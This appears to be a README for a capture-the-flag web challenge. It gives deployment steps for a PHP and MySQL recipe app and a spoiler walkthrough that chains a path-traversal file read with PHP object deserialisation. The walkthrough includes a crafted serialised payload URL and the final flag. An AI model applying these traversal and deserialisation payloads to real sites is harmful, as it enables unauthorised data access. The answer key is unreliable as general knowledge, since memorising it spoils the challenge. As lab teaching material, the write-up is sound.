# Saucy Part 3

## Overview

Built by Mac

A web app exploring a vulnerability allowing the viewing of the source code, and a classic OWASP vulnerability providing the solution. Requires some code analysis and knowledge of common web vulnerabilities to solve.

<details>

<summary>Spoilers</summary>

The challenge is a PHP web app with an LFI revealing the source code and a PHP deserialisation vulnerability. Players must create a 'recipe recipe' that is pulled down from the database and that reads a second recipe from the database when it is unserialised, which contains the flag.

</details>

## Deploy This Challenge Manually

### Install MySQL

```bash
$ sudo apt install mysql-server
```

Start service:

```bash
$ sudo service mysql start
```

*Note:* if using WSL, you may get a failed to start message. This is because windows may have a similar `mysql.exe` process running that binds to same port. Close this in task manager to fix the error. You may also need to run the following:

```bash
$ sudo service mysql stop
$ sudo usermod -d /var/lib/mysql/ mysql
```

Setup MySQL:

```bash
$ sudo mysql_secure_installation
```

Install the MySQL PHP library:

```bash
$ sudo apt install php-mysql
```

### Create a conf_secret.php file

Create a `php` file with the credentials to your local MySQL database, or another database you're connecting to:

```php
<?php

$server = 'localhost';
$username = 'username';
$password = 'password';
$database = 'recipes';

?>
```

### Seed the Database

Run the following command, supplying the `username` and `password` you set:

```bash
$ mysql -u [username] -p < seed.sql
```

### Start the Challenge

Run the PHP server:

```bash
php -S locahost:8002
```

Visit [http://localhost:8002](http://localhost:8002)

(*note:* when we deployed, we also had to remove sensitive files from the system, such as `.git` folders, the `README.md` file, and `gen-object.php`, which was used for testing the challenge)

## Solution

<details>

<summary>Spoilers</summary>

Visiting the page, we see it seems to be some sort of web app for viewing and creating recipes. If we try searching for `horseradish-sauce.txt` as suggested, we get a recipe for horseradish sauce back.

We can also read recipes from the database by ID - let's try an ID of 1 by visiting `/get-recipe.php` with the `?id=1` parameter... We get a 'secret recipe' back - but it seems to be encrypted!

We can also use the third option to 'build' a recipe using a string that's saved in the database. This is especially interesting - giving it a random string takes us to the `get-recipe.php` page also, but this time with a `string_id` parameter. Supplying `1` gives us an encrypted recipe for mayonnaise.

Let's try and find out more about how the app works. The fact we have to specify `.txt` when reading a recipe file is interesting - that suggests we may be directly accessing the filesystem. Can we get an LFI?

The source has a message for developers:

```html
<!-- DEVS: See code for retrieving recipes in get-recipe.php -->
<!-- DEVS: See code for submitting new recipes in create-recipe.php -->
```

We can try reading one of these files - after a bit of experimenting, supplying `../get-recipe.php` works! The `..` operator lets us go up a directory, presumably from a directory storing recipe `.txt` files to the main directory where code is stored.

We can now arbitrarily read the web application code! We could also use this to poke around for sensitive files - perhaps database creds, or SSH keys - but I know this challenge doesn't involve remote access to the database or webserver itself, so I won't go into doing that.

`create-recipe.php` shows we can insert data into the database:

```php
$recipe_string = $_GET["recipe_recipe"];

//check they're submitting a Secret Recipe class
if(strpos($recipe_string, 'O:12:"SecretRecipe"') !== false) {
    //insert into recipe_strings database
    error_log("Inserting");

    Database::initialize();

    $stmt = Database::$conn->prepare("INSERT INTO recipe_strings (recipe_recipe) VALUES (?)");

    // execute statement with submitted string

    $stmt->bind_param("s", $recipe_string);

    $stmt->execute();

    // close statement
    $stmt->close();

    // get ID of last item
    $id = Database::$conn->insert_id;

    echo("Thanks for submitting! Your ID: ". $id);
}
```

It looks like it is expecting a serialised object of the `SecretRecipe` class, as it checks our string contains `O:12:"SecretRecipe"`. This is an indicator that there may be some deserialisation down the line - perhaps in the `get-recipe.php` file?

If we give the program a `string_id`, we can pull down a serialised string from the database:

```php
elseif ($_GET['string_id']){
    //getting recipe string from DB by ID, constructing recipe

    error_log("Getting recipe string by ID");

    error_log($_GET['string_id']);

    $id = intval($_GET['string_id']);

    //get recipe string from DB based on ID
    Database::initialize();

    $stmt = Database::$conn->prepare("SELECT recipe_recipe FROM recipe_strings WHERE id = ?");

    // execute statement with ID variable

    $stmt->bind_param("i", $id);

    $stmt->execute();

    $stmt->bind_result($recipe_recipe);

    //get results

    while ($stmt->fetch()) {

        error_log("Recipe string from DB: " . $recipe_recipe);

        // deserialise recipe string

        unserialize($recipe_recipe);
    }

    // close statement
    $stmt->close();
}
```

Crucially, this is then deserialised (by the `unserialize()` call), and the wakeup function then reads the recipe from the database based on its ID:

```php
public function __wakeup() {
    //grab from DB when deserialised
    error_log("Woken up - getting from DB");

    $this->get_from_db();
}
```

This suggests we may be able to create a serialised `SecretRecipe` object that grabs the encrypted recipe - but how can we exploit this?

Well, there is an `if` statement that checks the value of the object's `$encrypted` variable - this determines whether the recipe is hashed or not:

```php
while ($stmt->fetch()) {
    if ($this->encrypted) {
        echo("<h3>Title</h3>");
        echo("<p>" . $recipe_title . "</p>");
        echo("<h3>Recipe</h3>");
        echo("<p>" . hash('sha256', $recipe_text) . "</p>");
    }
    else {
        echo("<h3>Title</h3>");
        echo("<p>" . $recipe_title . "</p>");
        echo("<h3>Recipe</h3>");
        echo("<p>" . $recipe_text . "</p>");
    }
}
```

When we create a serialised PHP object, we have full control of its variables - so we can set our own object's `$encrypted` variable to `False`, like so:

```php
O:12:"SecretRecipe":4:{s:9:"encrypted";b:0;s:5:"title";s:4:"Test";s:8:"contents";s:4:"Test";s:2:"id";i:1;}
```

This is a serialised PHP object - the `O:12:"SecretRecipe"` string specifies its class, and the strings within the curly brackets specift the class variables. The important ones are  `"id";i:1`, specifying the integer `1` (the ID of the recipe we want to pull down), and `"encrypted";b:0`, specifying we want to set `$encrypted` to false.

If this doesn't make sense, you can learn more about deserialisation with a simpler example from my [demo on the topic](https://github.com/Twigonometry/Deserialisation-Demo).

Let's submit this at the `create-recipe.php` page, by visiting `http://localhost:5000/create-recipe.php?recipe_recipe=O:12:%22SecretRecipe%22:4:{s:9:%22encrypted%22;b:0;s:5:%22title%22;s:4:%22Test%22;s:8:%22contents%22;s:4:%22Test%22;s:2:%22id%22;i:1;}`.

Now we just need to trigger our deserialisation, by searching for our recipe string by ID... and voila - we have an unencrypted recipe!

```
1) Add c00k13s to a bowl 2) Mix in some syntactic sUg4R 3) Take two bYT3s
```

Now it just needs decoding... If we submit `sesh{c00k13s_sUg4R_bYT3s_bYT3s}`, we get the points!

</details>